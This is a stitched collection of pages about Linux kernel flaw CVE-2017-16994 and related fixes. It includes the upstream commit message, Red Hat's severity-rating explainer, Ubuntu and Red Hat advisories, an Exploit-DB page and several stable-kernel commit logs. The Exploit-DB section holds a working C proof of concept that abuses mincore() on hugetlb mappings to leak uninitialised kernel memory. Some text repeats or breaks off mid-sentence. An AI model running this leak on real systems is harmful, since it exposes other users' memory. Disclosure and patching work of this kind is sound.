mm/pagewalk.c: report holes in hugetlb ranges

```
This matters at least for the mincore syscall, which will otherwise copy
uninitialized memory from the page allocator to userspace.  It is
probably also a correctness error for /proc/$pid/pagemap, but I haven't
tested that.

Removing the `walk->hugetlb_entry` condition in walk_hugetlb_range() has
no effect because the caller already checks for that.

This only reports holes in hugetlb ranges to callers who have specified
a hugetlb_entry callback.

This issue was found using an AFL-based fuzzer.

v2:
 - don't crash on ->pte_hole==NULL (Andrew Morton)
 - add Cc stable (Andrew Morton)

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 16.04

* [linux-image-4.13.0-1012-gcp](https://launchpad.net/ubuntu/%2Bsource/linux-gcp)
  -
  [4.13.0-1012.16](https://launchpad.net/ubuntu/%2Bsource/linux-gcp/4.13.0-1012.16)
* [linux-image-4.13.0-1022-oem](https://launchpad.net/ubuntu/%2Bsource/linux-oem)
  -

* [linux-image-4.13.0-38-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux-hwe)
  -
  [4.13.0-38.43~16.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-hwe/4.13.0-38.43~16.04.1)

  [4.13.0-38.43~16.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-hwe/4.13.0-38.43~16.04.1)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2018%3A0502)

## Topic

An update for kernel-alt is now available for Red Hat Enterprise Linux 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

The kernel-alt packages provide the Linux kernel version 4.x.

Security Fix(es):

* hw: cpu: speculative execution permission faults handling (CVE-2017-5754, Important)(ppc only)
* kernel: Race condition in raw\_sendmsg function allows denial-of-service or kernel addresses leak (CVE-2017-17712, Important)
* kernel: mm/pagewalk.c:walk\_hugetlb\_range function mishandles holes in hugetlb ranges causing information leak (CVE-2017-16994, Moderate)

Bug Fix(es):

* When changing the Maximum Transmission Unit (MTU) size on Broadcom BCM5717, BCM5718 and BCM5719 chipsets, the tg3 driver sometimes lost synchronization with the device. Consequently, the device became unresponsive. With this update, tg3 has been fixed, and devices no longer hang due to this behavior. (BZ#1533478)
* Previously, the perf tool used strict string matching to provide related events to a particular CPUID instruction. Consequently, the events were not available on certain IBM PowerPC systems. This update fixes perf to use regular expressions instead of string matching of the entire CPUID string. As a result, the perf tool now supports events on IBM PowerPC architectures as expected. (BZ#1536567)
* Previously, the kernel debugfs file system implemented removal protection based on sleepable read-copy-update (SRCU), which slowed down the drivers relying on the debugfs\_remove\_recursive() function. Consequently, a decrease in performance or a deadlock sometimes occurred. This update implements per-file removal protection in debugfs. As a result, the performance of the system has improved significantly. (BZ#1538030)
* When running the 'perf test' command on a PowerKVM guest multiple times, the branch instructions recorded in Branch History Rolling Buffer (BHRB) entries were sometimes unmapped before the kernel processed the entries. Consequently, the operating system terminated unexpectedly. This update fixes the bug, and the operating system no longer crashes in the described situation. (BZ#1538031)

| [Description](show_bug.cgi?id=1519781#c0)  Petr Matousek    2017-12-01 13:01:16 UTC  ``` An industry-wide issue was found in the way many modern microprocessor designs have implemented speculative execution of instructions (a commonly used performance optimization). There are three primary variants of the issue which differ in the way the speculative execution can be exploited.  Variant [CVE-2017-5754](https://access.redhat.com/security/cve/CVE-2017-5754) relies on the fact that, on impacted microprocessors, during speculative execution of instruction permission faults, exception generation triggered by a faulting access is suppressed until the retirement of the whole instruction block. In a combination with the fact that memory accesses may populate the cache even when the block is being dropped and never committed (executed), an unprivileged local attacker could use this flaw to read privileged (kernel space) memory by conducting targeted cache side-channel attacks.  Note: [CVE-2017-5754](https://access.redhat.com/security/cve/CVE-2017-5754) affects Intel x86-64 microprocessors.

Statement:  Please see the Vulnerability Response article for the full list of updates available and a detailed discussion of this issue.  Meltdown patches for 32-bit Red Hat Enterprise Linux 5 ------------------------------------------------------  Red Hat has no current plans to provide mitigations for the Meltdown vulnerability in 32-bit Red Hat Enterprise Linux 5 environments.  Following many hours of engineering investigation and analysis, Red Hat has determined that introducing changes to the Red Hat Enterprise Linux 5 environment would destabilize customer deployments and violate our  application binary interface (ABI) and kernel ABI commitments to customers who rely on Red Hat Enterprise Linux 5 to be absolutely stable.  Although Red Hat has delivered patches to mitigate the Meltdown vulnerability in other supported product offerings, the 32-bit Red Hat Enterprise Linux 5 environment presents unique challenges.  The combination of limited address space in 32-bit environments plus the mechanism for passing control from the userspace to kernel and limitations on the stack during this transfer make the projected changes too invasive and disruptive for deployments that require the highest level of system stability.  By contrast, 32-bit Meltdown mitigations have been delivered for Red Hat Enterprise Linux 6, where the changes are far less invasive and risky.   ```  [Comment 53](show_bug.cgi?id=1519781#c53)  Doran Moppert    2020-03-27 02:43:08 UTC  ``` External References:  <https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html> <https://spectreattack.com/> <https://meltdownattack.com>   ``` |  |

implementation in the Linux kernel. A local attacker could use this to

cause a denial of service (kernel deadlock). ([CVE-2017-18204](/security/CVE-2017-18204))

It was discovered that the Broadcom NetXtremeII ethernet driver in the

Linux kernel did not properly validate Generic Segment Offload (GSO) packet

sizes. An attacker could use this to cause a denial of service (interface

unavailability). ([CVE-2018-1000026](/security/CVE-2018-1000026))

It was discovered that the Reliable Datagram Socket (RDS) implementation in

the Linux kernel contained an out-of-bounds write during RDMA page allocation. An

attacker could use this to cause a denial of service (system crash) or

possibly execute arbitrary code. ([CVE-2018-5332](/security/CVE-2018-5332))

Mohamed Ghannam discovered a null pointer dereference in the RDS (Reliable

Datagram Sockets) protocol implementation of the Linux kernel. A local

attacker could use this to cause a denial of service (system crash).

([CVE-2018-5333](/security/CVE-2018-5333))

范龙飞 discovered that a race condition existed in loop block device

implementation in the Linux kernel. A local attacker could use this to

cause a denial of service (system crash) or possibly execute arbitrary

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 17.10

* [linux-image-4.13.0-1016-raspi2](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2)
  -
  [4.13.0-1016.17](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2/4.13.0-1016.17)
* [linux-image-raspi2](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2)
  -
  [4.13.0.1016.14](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2/4.13.0-1016.17)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

```
/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1431

I found the following bug with an AFL-based fuzzer:

When __walk_page_range() is used on a VM_HUGETLB VMA, callbacks from the mm_walk structure are only invoked for present pages. However, do_mincore() assumes that it will always get callbacks for all pages in the range passed to walk_page_range(), and when this assumption is violated, sys_mincore() copies uninitialized memory from the page allocator to userspace.

This bug can be reproduced with the following testcase:

$ cat mincore_test.c
*/

#define _GNU_SOURCE
#include <unistd.h>
#include <sys/mman.h>
#include <err.h>
#include <stdio.h>

unsigned char mcbuf[0x1000];

int main(void) {
  if (mmap((void*)0x66000000, 0x20000000000, PROT_NONE, MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | MAP_NORESERVE, -1, 0) == MAP_FAILED)
    err(1, "mmap");

  for (int i=0; i<10000; i++) {
    if (mincore((void*)0x86000000, 0x1000000, mcbuf))
      perror("mincore");
    write(1, mcbuf, 0x1000);
  }
}

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# USN-3632-1: Linux kernel (Azure) vulnerabilities

24 April 2018

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [linux-azure](/security/cves?package=linux-azure) - Linux kernel for Microsoft Azure Cloud systems

## Details

It was discovered that a race condition leading to a use-after-free

vulnerability existed in the ALSA PCM subsystem of the Linux kernel. A

local attacker could use this to cause a denial of service (system crash)

or possibly execute arbitrary code. ([CVE-2017-0861](/security/CVE-2017-0861))

It was discovered that the KVM implementation in the Linux kernel allowed

passthrough of the diagnostic I/O port 0x80. An attacker in a guest VM

could use this to cause a denial of service (system crash) in the host OS.

([CVE-2017-1000407](/security/CVE-2017-1000407))

It was discovered that a use-after-free vulnerability existed in the

network namespaces implementation in the Linux kernel. A local attacker

could use this to cause a denial of service (system crash) or possibly

execute arbitrary code. ([CVE-2017-15129](/security/CVE-2017-15129))

It was discovered that the HugeTLB component of the Linux kernel did not

properly handle holes in hugetlb ranges. A local attacker could use this to

expose sensitive information (kernel memory). ([CVE-2017-16994](/security/CVE-2017-16994))

It was discovered that the netfilter component of the Linux did not

properly restrict access to the connection tracking helpers list. A local

attacker could use this to bypass intended access restrictions.

([CVE-2017-17448](/security/CVE-2017-17448))

It was discovered that the netfilter passive OS fingerprinting (xt\_osf)

module did not properly perform access control checks. A local attacker

could improperly modify the system-wide OS fingerprint list.

([CVE-2017-17450](/security/CVE-2017-17450))

Dmitry Vyukov discovered that the KVM implementation in the Linux kernel

contained an out-of-bounds read when handling memory-mapped I/O. A local

attacker could use this to expose sensitive information. ([CVE-2017-17741](/security/CVE-2017-17741))

It was discovered that the Salsa20 encryption algorithm implementations in

the Linux kernel did not properly handle zero-length inputs. A local

attacker could use this to cause a denial of service (system crash).

([CVE-2017-17805](/security/CVE-2017-17805))

It was discovered that the HMAC implementation did not validate the state

of the underlying cryptographic hash algorithm. A local attacker could use

this to cause a denial of service (system crash) or possibly execute

arbitrary code. ([CVE-2017-17806](/security/CVE-2017-17806))

It was discovered that the keyring implementation in the Linux kernel did

not properly check permissions when a key request was performed on a task's

default keyring. A local attacker could use this to add keys to

unauthorized keyrings. ([CVE-2017-17807](/security/CVE-2017-17807))

It was discovered that the Broadcom NetXtremeII ethernet driver in the

Linux kernel did not properly validate Generic Segment Offload (GSO) packet

sizes. An attacker could use this to cause a denial of service (interface

unavailability). ([CVE-2018-1000026](/security/CVE-2018-1000026))

It was discovered that the Reliable Datagram Socket (RDS) implementation in

the Linux kernel contained an out-of-bounds write during RDMA page

allocation. An attacker could use this to cause a denial of service (system

crash) or possibly execute arbitrary code. ([CVE-2018-5332](/security/CVE-2018-5332))

Mohamed Ghannam discovered a null pointer dereference in the RDS (Reliable

Datagram Sockets) protocol implementation of the Linux kernel. A local

attacker could use this to cause a denial of service (system crash).

([CVE-2018-5333](/security/CVE-2018-5333))

范龙飞 discovered that a race condition existed in loop block device

implementation in the Linux kernel. A local attacker could use this to

cause a denial of service (system crash) or possibly execute arbitrary

code. ([CVE-2018-5344](/security/CVE-2018-5344))

It was discovered that the Broadcom UniMAC MDIO bus controller driver in

the Linux kernel did not properly validate device resources. A local

attacker could use this to cause a denial of service (system crash).

([CVE-2018-8043](/security/CVE-2018-8043))

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 16.04

* [linux-image-4.13.0-1014-azure](https://launchpad.net/ubuntu/%2Bsource/linux-azure)
  -
  [4.13.0-1014.17](https://launchpad.net/ubuntu/%2Bsource/linux-azure/4.13.0-1014.17)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

mm/pagewalk.c: report holes in hugetlb rangesThis matters at least for the mincore syscall, which will otherwise copy
uninitialized memory from the page allocator to userspace. It is
probably also a correctness error for /proc/$pid/pagemap, but I haven't
tested that.
Removing the `walk->hugetlb\_entry` condition in walk\_hugetlb\_range() has
no effect because the caller already checks for that.
This only reports holes in hugetlb ranges to callers who have specified
a hugetlb\_entry callback.
This issue was found using an AFL-based fuzzer.
v2:
- don't crash on ->pte\_hole==NULL (Andrew Morton)
- add Cc stable (Andrew Morton)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

coda: fix 'kernel memory exposure attempt' in fsync
commit d337b66a4c52c7b04eec661d86c2ef6e168965a2 upstream.
When an application called fsync on a file in Coda a small request with
just the file identifier was allocated, but the declared length was set
to the size of union of all possible upcall requests.
This bug has been around for a very long time and is now caught by the
extra checking in usercopy that was introduced in Linux-4.8.
The exposure happens when the Coda cache manager process reads the fsync
upcall request at which point it is killed. As a result there is nobody
servicing any further upcalls, trapping any processes that try to access
the mounted Coda filesystem.

mm/page\_ext.c: check if page\_ext is not prepared
commit e492080e640c2d1235ddf3441cae634cfffef7e1 upstream.
online\_page\_ext() and page\_ext\_init() allocate page\_ext for each
section, but they do not allocate if the first PFN is !pfn\_present(pfn)
or !pfn\_valid(pfn). Then section->page\_ext remains as NULL.
lookup\_page\_ext checks NULL only if CONFIG\_DEBUG\_VM is enabled. For a
valid PFN, \_\_set\_page\_owner will try to get page\_ext through
lookup\_page\_ext. Without CONFIG\_DEBUG\_VM lookup\_page\_ext will misuse
NULL pointer as value 0. This incurrs invalid address access.
This is the panic example when PFN 0x100000 is not valid but PFN
0x13FC00 is being used for page\_ext. section->page\_ext is NULL,
get\_entry returned invalid page\_ext address as 0x1DFA000 for a PFN
0x13FC00.
To avoid this panic, CONFIG\_DEBUG\_VM should be removed so that page\_ext
will be checked at all times.

mm/page\_alloc.c: broken deferred calculation
commit d135e5750205a21a212a19dbb05aeb339e2cbea7 upstream.
In reset\_deferred\_meminit() we determine number of pages that must not
be deferred. We initialize pages for at least 2G of memory, but also
pages for reserved memory in this node.
The reserved memory is determined in this function:
memblock\_reserved\_memory\_within(), which operates over physical
addresses, and returns size in bytes. However, reset\_deferred\_meminit()
assumes that that this function operates with pfns, and returns page
count.
The result is that in the best case machine boots slower than expected
due to initializing more pages than needed in single thread, and in the
worst case panics because fewer than needed pages are initialized early.

ocfs2: fix cluster hang after a node dies
commit 1c01967116a678fed8e2c68a6ab82abc8effeddc upstream.
When a node dies, other live nodes have to choose a new master for an
existed lock resource mastered by the dead node.
As for ocfs2/dlm implementation, this is done by function -
dlm\_move\_lockres\_to\_recovery\_list which marks those lock rsources as
DLM\_LOCK\_RES\_RECOVERING and manages them via a list from which DLM
changes lock resource's master later.
So without invoking dlm\_move\_lockres\_to\_recovery\_list, no master will be
choosed after dlm recovery accomplishment since no lock resource can be
found through ::resource list.
What's worse is that if DLM\_LOCK\_RES\_RECOVERING is not marked for lock
resources mastered a dead node, it will break up synchronization among
nodes.
So invoke dlm\_move\_lockres\_to\_recovery\_list again.
Fixs: 'commit ee8f7fcbe638 ("ocfs2/dlm: continue to purge recovery lockres when recovery master goes down")'

mm/pagewalk.c: report holes in hugetlb ranges
commit 373c4557d2aa362702c4c2d41288fb1e54990b7c upstream.
This matters at least for the mincore syscall, which will otherwise copy
uninitialized memory from the page allocator to userspace. It is
probably also a correctness error for /proc/$pid/pagemap, but I haven't
tested that.
Removing the `walk->hugetlb\_entry` condition in walk\_hugetlb\_range() has
no effect because the caller already checks for that.
This only reports holes in hugetlb ranges to callers who have specified
a hugetlb\_entry callback.
This issue was found using an AFL-based fuzzer.

tpm-dev-common: Reject too short writes
commit ee70bc1e7b63ac8023c9ff9475d8741e397316e7 upstream.
tpm\_transmit() does not offer an explicit interface to indicate the number
of valid bytes in the communication buffer. Instead, it relies on the
commandSize field in the TPM header that is encoded within the buffer.
Therefore, ensure that a) enough data has been written to the buffer, so
that the commandSize field is present and b) the commandSize field does not
announce more data than has been written to the buffer.
This should have been fixed with CVE-2011-1161 long ago, but apparently
a correct version of that patch never made it into the kernel.

ima: do not update security.ima if appraisal status is not INTEGRITY\_PASS
commit 020aae3ee58c1af0e7ffc4e2cc9fe4dc630338cb upstream.
Commit b65a9cfc2c38 ("Untangling ima mess, part 2: deal with counters")
moved the call of ima\_file\_check() from may\_open() to do\_filp\_open() at a
point where the file descriptor is already opened.
This breaks the assumption made by IMA that file descriptors being closed
belong to files whose access was granted by ima\_file\_check(). The
consequence is that security.ima and security.evm are updated with good
values, regardless of the current appraisal status.
For example, if a file does not have security.ima, IMA will create it after
opening the file for writing, even if access is denied. Access to the file
will be allowed afterwards.
Avoid this issue by checking the appraisal status before updating
security.ima.

net/sctp: Always set scope\_id in sctp\_inet6\_skb\_msgname
[ Upstream commit 7c8a61d9ee1df0fb4747879fa67a99614eb62fec ]
Alexandar Potapenko while testing the kernel with KMSAN and syzkaller
discovered that in some configurations sctp would leak 4 bytes of
kernel stack.
Working with his reproducer I discovered that those 4 bytes that
are leaked is the scope id of an ipv6 address returned by recvmsg.
With a little code inspection and a shrewd guess I discovered that
sctp\_inet6\_skb\_msgname only initializes the scope\_id field for link
local ipv6 addresses to the interface index the link local address
pertains to instead of initializing the scope\_id field for all ipv6
addresses.
That is almost reasonable as scope\_id's are meaniningful only for link
local addresses. Set the scope\_id in all other cases to 0 which is
not a valid interface index to make it clear there is nothing useful
in the scope\_id field.
There should be no danger of breaking userspace as the stack leak
guaranteed that previously meaningless random data was being returned.

af\_netlink: ensure that NLMSG\_DONE never fails in dumps
[ Upstream commit 0642840b8bb008528dbdf929cec9f65ac4231ad0 ]
The way people generally use netlink\_dump is that they fill in the skb
as much as possible, breaking when nla\_put returns an error. Then, they
get called again and start filling out the next skb, and again, and so
forth. The mechanism at work here is the ability for the iterative
dumping function to detect when the skb is filled up and not fill it
past the brim, waiting for a fresh skb for the rest of the data.
However, if the attributes are small and nicely packed, it is possible
that a dump callback function successfully fills in attributes until the
skb is of size 4080 (libmnl's default page-sized receive buffer size).
The dump function completes, satisfied, and then, if it happens to be
that this is actually the last skb, and no further ones are to be sent,
then netlink\_dump will add on the NLMSG\_DONE part:
nlh = nlmsg\_put\_answer(skb, cb, NLMSG\_DONE, sizeof(len), NLM\_F\_MULTI);
It is very important that netlink\_dump does this, of course. However, in
this example, that call to nlmsg\_put\_answer will fail, because the
previous filling by the dump function did not leave it enough room. And
how could it possibly have done so? All of the nla\_put variety of
functions simply check to see if the skb has enough tailroom,
independent of the context it is in.
In order to keep the important assumptions of all netlink dump users, it
is therefore important to give them an skb that has this end part of the
